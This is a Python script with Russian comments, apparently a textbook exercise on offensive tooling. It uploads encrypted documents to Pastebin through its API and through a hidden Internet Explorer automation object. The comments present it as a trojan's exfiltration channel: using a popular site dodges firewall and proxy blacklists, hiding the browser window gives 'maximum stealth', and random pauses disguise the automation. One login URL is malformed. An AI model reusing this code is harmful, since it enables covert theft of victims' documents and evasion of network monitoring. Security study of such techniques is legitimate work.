""" чтобы передавать зашифрованную информацию веб-серверу посредством POST-запроса. Мы автоматизируем процесс загрузки
зашифрованного документа в учетную запись https://pastebin.com/. Это позволит нам тайно сохранить документ в интернете и
забрать его в любое удобное время, но так, чтобы никто другой не смог его расшифровать. К тому же за счет использования
общеизвестного веб-сайта, такого как Pastebin, мы должны обойти любые черные списки, используемые брандмауэром или
прокси-сервером, — если бы задействовали IP-адрес или принадлежащий нам веб-сервер, отправка документа могла бы быть
заблокирована. """

from win32com import client
import os
import random
import requests
import time
from secret import username, password, api_dev_key


def plain_paste(title, contents):
    """plain_paste, как и предыдущие почтовые функции, принимает в качестве аргументов имя файла, которое будет играть
    роль заголовка, и зашифрованное содержимое . Чтобы опубликовать фрагмент от своего имени, вам нужно сделать два
     запроса. Сначала следует послать POST-запрос API login, указав username, api_dev_key и password
     Когда функция завершит работу, войдите в свою учетную запись на сайте https://pastebin.com/ — вы должны увидеть
      свои зашифрованные данные. Можете скачать этот фрагмент на своей информационной панели для последующей расшифровки."""
    login_url = 'https:///pastebin.com/api_login.php'
    login_data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password,
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text  #  В ответ вы получите ключ api_user_key, необходимый для публикации фрагмента от своего имени

    paste_url = 'https://pastebin.com/api/api_post.php'  # Второй запрос будет направлен к API post
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data)  # Укажите название фрагмента (мы используем имя файла) и его содержимое, а также свои API-ключи user и dev
    print(r.status_code)
    print(r.text)


def wait_for_browser(browser):
    """следит за тем, чтобы браузер завершил обработку всех своих событий"""
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)


def random_sleep():
    """делает так, чтобы поведение браузера выглядело случайным, не похожим на запрограммированное
    останавливается на период случайной длины, это позволяет браузеру выполнять задания, события в которых могут не
    регистрироваться с помощью объектной модели документа (Document Object Model, DOM) и, следовательно, не
    сигнализировать о своем завершении. """
    time.sleep(random.randint(5, 10))


def login(ie):
    """Функция login первым делом извлекает все элементы в DOM . Она ищет поля с именем пользователя и паролем ,
     присваивая им предоставленные нами учетные данные (не забудьте зарегистрироваться)."""
    full_doc = ie.Document.all  # извлекает все элементы в DOM
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)

    random_sleep()


def submit(ie, title, contents):
    """проходимся по DOM, чтобы найти места, в которых можно указать заголовок и тело публикуемого фрагмента. Функция
    submit принимает экземпляр браузера вместе с именем и содержимым зашифрованного файла, который нужно отправить"""
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    if ie.Document.forms[0].id == 'w0':
        ie.Document.forms[0].submit()
    random_sleep()
    wait_for_browser(ie)


def ie_paste(title, contents):
    """Функция ie_paste вызывается для каждого документа, который мы хотим сохранить в Pastebin. Вначале она создает
    новый COM-объект Internet Explorer . Мы сами можем решать, будет процесс видимым или нет. На время отладки оставьте
    значение 1, но когда вам нужна будет максимальная скрытность, обязательно поменяйте его на 0. Это по-настоящему
    полезно в ситуациях, когда ваш троян, к примеру, следит за происходящим в системе, — вы можете начать передачу
    документов в момент повышенной активности, чтобы ваши действия еще лучше сливались с действиями пользователя.
    Вызвав все вспомогательные функции, мы просто удаляем свой экземпляр Internet Explorer  и завершаем работу"""
    ie = client.Dispatch('InternetExplorer.Application')
    ie.Visible = 1
    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    ie.Quit()


if __name__ == '__main__':
    ie_paste('title', 'contents')
